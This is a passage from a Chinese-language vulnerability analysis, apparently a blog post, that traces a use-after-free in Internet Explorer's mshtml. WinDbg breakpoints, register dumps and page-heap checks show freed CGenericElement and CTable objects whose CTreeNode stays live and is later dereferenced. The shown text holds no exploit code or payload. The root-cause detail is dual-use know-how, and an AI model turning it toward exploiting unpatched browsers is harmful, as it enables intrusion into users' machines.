<li><code>CTreeNode</code> 没有在 <code>CGenericElement</code> 元素释放的时候被释放。一般是由于 <code>CTreeNode</code> 的引用计数错误的加1</li>
</ul>
</blockquote>
<p>如何判断属于上面哪一种情况呢？在程序结尾处观察 <code>CGenericElement</code>  和 <code>CTreeNode</code> 是否被释放，调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4)&quot;</span><br><span class="line">0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax&quot;</span><br><span class="line">Matched: 6869141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 686cd6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax&quot;&apos;</span><br><span class="line">0:013&gt; bu 686cd6de + 0x41 &quot;ln eax&quot;</span><br><span class="line">0:013&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax; dps poi(eax) L1&quot;</span><br><span class="line">0:013&gt; g</span><br><span class="line">.............................................</span><br><span class="line">0:005&gt; g</span><br><span class="line">ModLoad: 6bf30000 6bfe2000   C:\Windows\System32\jscript.dll</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">079f7fd8  68555570 00000001 00000008 00000000</span><br><span class="line">079f7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">079f7ff8  00000000 00000000</span><br><span class="line">eax=079f7fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=079f7fd8 edi=079f7fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">079d9fb0  079f7fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">079d9fc0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9fd0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9fe0  00000000 00000000 00000000 00000000</span><br><span class="line">079d9ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">079da000  ???????? ???????? ???????? ????????</span><br><span class="line">079da010  ???????? ???????? ???????? ????????</span><br><span class="line">079da020  ???????? ???????? ???????? ????????</span><br><span class="line">079f7fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=079d9fb0 ebx=00000000 ecx=079d9fb0 edx=00000008 esi=079d9fb0 edi=079f7fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a90fd8  68555570 00000001 00000008 00000000</span><br><span class="line">07a90fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07a90ff8  00000000 00000000</span><br><span class="line">eax=07a90fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a90fd8 edi=07a90fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">079e1fb0  07a90fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">079e1fc0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1fd0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1fe0  00000000 00000000 00000000 00000000</span><br><span class="line">079e1ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">079e2000  ???????? ???????? ???????? ????????</span><br><span class="line">079e2010  ???????? ???????? ???????? ????????</span><br><span class="line">079e2020  ???????? ???????? ???????? ????????</span><br><span class="line">07a90fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=079e1fb0 ebx=00000000 ecx=079e1fb0 edx=00000008 esi=079e1fb0 edi=07a90fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a63fd8  68555570 00000001 00000008 00000000</span><br><span class="line">07a63fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07a63ff8  00000000 00000000</span><br><span class="line">eax=07a63fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a63fd8 edi=07a63fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07a9cfb0  07a63fd8 079edfb0 ffff005b ffffffff</span><br><span class="line">07a9cfc0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cfd0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cfe0  00000000 00000000 00000000 00000000</span><br><span class="line">07a9cff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">07a9d000  ???????? ???????? ???????? ????????</span><br><span class="line">07a9d010  ???????? ???????? ???????? ????????</span><br><span class="line">07a9d020  ???????? ???????? ???????? ????????</span><br><span class="line">07a63fd8  68648fd8 mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">eax=07a9cfb0 ebx=00000000 ecx=07a9cfb0 edx=00000008 esi=07a9cfb0 edi=07a63fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">076fefc8  68555570 00000001 00000008 00000000</span><br><span class="line">076fefd8  00000000 00000000 00000000 00000000</span><br><span class="line">076fefe8  00000000 00000000</span><br><span class="line">eax=076fefc8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=076fefc8 edi=076fefc8</span><br><span class="line">eip=686c9ff1 esp=0451c89c ebp=0451c8a8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">0770cfb0  076fefc8 07a9cfb0 ffff0075 ffffffff</span><br><span class="line">0770cfc0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cfd0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cfe0  00000000 00000000 00000000 00000000</span><br><span class="line">0770cff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">0770d000  ???????? ???????? ???????? ????????</span><br><span class="line">0770d010  ???????? ???????? ???????? ????????</span><br><span class="line">0770d020  ???????? ???????? ???????? ????????</span><br><span class="line">076fefc8  6865c590 mshtml!CGenericElement::`vftable&apos;</span><br><span class="line">eax=0770cfb0 ebx=00000000 ecx=0770cfb0 edx=00000008 esi=0770cfb0 edi=076fefc8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a80fb8  68555570 00000001 00000008 00000000</span><br><span class="line">07a80fc8  00000000 00000000 00000000 00000000</span><br><span class="line">07a80fd8  00000000 00000000</span><br><span class="line">eax=07a80fb8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a80fb8 edi=07a80fb8</span><br><span class="line">eip=686c9ff1 esp=0451c8a8 ebp=0451c8b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">07a72fb0  07a80fb8 079e1fb0 ffff0061 ffffffff</span><br><span class="line">07a72fc0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72fd0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72fe0  00000000 00000000 00000000 00000000</span><br><span class="line">07a72ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">07a73000  ???????? ???????? ???????? ????????</span><br><span class="line">07a73010  ???????? ???????? ???????? ????????</span><br><span class="line">07a73020  ???????? ???????? ???????? ????????</span><br><span class="line">07a80fb8  68556488 mshtml!CTable::`vftable&apos;</span><br><span class="line">eax=07a72fb0 ebx=00000000 ecx=07a72fb0 edx=00000008 esi=07a72fb0 edi=07a80fb8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">05ec0fd8  68555570 00000001 00000008 00000000</span><br><span class="line">05ec0fe8  00000000 00000000 00000000 00000000</span><br><span class="line">05ec0ff8  00000000 00000000</span><br><span class="line">eax=05ec0fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=05ec0fd8 edi=05ec0fd8</span><br><span class="line">eip=686c9ff1 esp=0451c8b4 ebp=0451c8c0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CElement::CElement+0x1e:</span><br><span class="line">686c9ff1 8b03            mov     eax,dword ptr [ebx]  ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;</span><br><span class="line">0:005&gt; g</span><br><span class="line">&apos;=== CTreeNode ===&apos;</span><br><span class="line">05ee3fb0  05ec0fd8 079d9fb0 ffff0030 ffffffff</span><br><span class="line">05ee3fc0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3fd0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3fe0  00000000 00000000 00000000 00000000</span><br><span class="line">05ee3ff0  00000008 00000000 00000000 d0d0d0d0</span><br><span class="line">05ee4000  ???????? ???????? ???????? ????????</span><br><span class="line">05ee4010  ???????? ???????? ???????? ????????</span><br><span class="line">05ee4020  ???????? ???????? ???????? ????????</span><br><span class="line">05ec0fd8  68559250 mshtml!CHRElement::`vftable&apos;</span><br><span class="line">eax=05ee3fb0 ebx=00000000 ecx=05ee3fb0 edx=00000008 esi=05ee3fb0 edi=05ec0fd8</span><br><span class="line">eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CMarkup::InsertElementInternal+0x253:</span><br><span class="line">6864b0bd 395c2410        cmp     dword ptr [esp+10h],ebx ss:0023:0451c848=00000000</span><br></pre></td></tr></table></figure></p>
<p>然后查看 <code>CGenericElement</code> 和 <code>CTable</code>  元素及对应的 <code>CTreeNode</code> 是否被释放。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 076fefc8      CGenericElement</span><br><span class="line">    address 076fefc8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    7b7064c:          76fe000             2000</span><br><span class="line"> </span><br><span class="line">0:005&gt; !heap -p -a 0770cfb0      CGenericElement对应的CTreeNode</span><br><span class="line">    address 0770cfb0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 78720d0:          770cfb0               4c -          770c000             2000</span><br><span class="line"> </span><br><span class="line">0:005&gt; !heap -p -a 07a80fb8      CTable</span><br><span class="line">    address 07a80fb8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    7b70f08:          7a80000             2000</span><br><span class="line"></span><br><span class="line">0:005&gt; !heap -p -a 07a72fb0      CTable对应的CTreeNode</span><br><span class="line">    address 07a72fb0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 151000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 7872034:          7a72fb0               4c -          7a72000             2000</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>CGenericElement</code> 和 <code>CTable</code> 都已经被释放，但是 <code>CTreeNode</code> 并没有被释放。所以属于第二种情况。可以猜测可能是由于当对<code>CTreeNode</code>指向的元素进行访问时，因为已经被删除，所以发生了异常。下面我们来看下哪些函数对 <code>CGenericElement</code> 的 <code>CTreeNode</code> 进行了访问(地址和上面调试的有出入，因为重新调了下)。<br><img src="http://static.zybuluo.com/dane909/uonmfny44d06qlb7glxz1xff/QQ%E6%88%AA%E5%9B%BE20180712194202.png" alt="QQ截图20180712194202.png-67.7kB"><br>由调试可知，<code>ISpanQualifier::GetFancyFormat</code> 函数里的 <code>CTreeNode</code> 参数来自于上一个函数的 <code>esi</code>,调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; bu ISpanQualifier::GetFancyFormat</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429af esp=0448acf0 ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat:</span><br><span class="line">682429af 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b1 esp=0448acf0 ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x2:</span><br><span class="line">682429b1 55              push    ebp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b2 esp=0448acec ebp=0448acfc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x3:</span><br><span class="line">682429b2 8bec            mov     ebp,esp</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b4 esp=0448acec ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x5:</span><br><span class="line">682429b4 56              push    esi</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b5 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x6:</span><br><span class="line">682429b5 8bf0            mov     esi,eax</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429b7 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x8:</span><br><span class="line">682429b7 e872330400      call    mshtml!ISpanQualifier::IsTreeNodeQualifier (68285d2e)</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429bc esp=0448ace8 ebp=0448acec iopl=0         nv up ei ng nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0xd:</span><br><span class="line">682429bc 84c0            test    al,al</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429be esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0xf:</span><br><span class="line">682429be 0f849e5d2300    je      mshtml!ISpanQualifier::GetFancyFormat+0x1a (68478762) [br=0]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429c4 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x11:</span><br><span class="line">682429c4 8bce            mov     ecx,esi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000001 ebx=059d3fa0 ecx=06ad8fb0 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28</span><br><span class="line">eip=682429c6 esp=0448ace8 ebp=0448acec iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!ISpanQualifier::GetFancyFormat+0x13:</span><br><span class="line">682429c6 e84e881600      call    mshtml!CTreeNode::GetFancyFormat (683ab219)</span><br><span class="line">0:005&gt; ln poi(poi(06ad8fb0))</span><br><span class="line">(682a8fd8)   mshtml!CSpanElement::`vftable&apos;   |  (681b73d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>继续回溯 <code>mshtml!SLayoutRun::HasInlineMbp</code> 函数。<br><img src="http://static.zybuluo.com/dane909/j8vjlg0ktfvi2u9nfyll195c/QQ%E6%88%AA%E5%9B%BE20180712202009.png" alt="QQ截图20180712202009.png-60.9kB"><br>继续回溯到函数 <code>mshtml!SRunPointer::HasInlineMbp</code>,在调用 <code>SLayoutRun::HasInlineMbp</code> 函数之前也调用了 <code>SRunPointer::SpanQualifier(void)</code>。如下图<br><img src="http://static.zybuluo.com/dane909/dgj3hjbaq6xdlkunvf7n9xr0/QQ%E6%88%AA%E5%9B%BE20180712203202.png" alt="QQ截图20180712203202.png-38.4kB"><br>跟进函数 <code>SRunPointer::SpanQualifier(void)</code> 发现其主要功能是 <code>eax= [[eax+4]+c]</code>,现在的 <code>eax</code> 即为 <code>CTreeNode</code> 的地址。<br><img src="http://static.zybuluo.com/dane909/me65zvw7mxgwrewukv0kdoyr/QQ%E6%88%AA%E5%9B%BE20180712203237.png" alt="QQ截图20180712203237.png-46.7kB"><br>下面通过 <code>windbg</code> 调试看下在崩溃前 <code>eax+4</code> 地址处内存。如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&apos;=====eax+4=====&apos;</span><br><span class="line">0481cec8  07516fd0 00000000 06f58fc8 0481cf0c</span><br><span class="line">0481ced8  685b4b64 0481cef3 00000000 00000000</span><br><span class="line">0481cee8  0481d018 68625be8 0000cf04 00000000</span><br><span class="line">0481cef8  00000031 0481cf73 687406bf 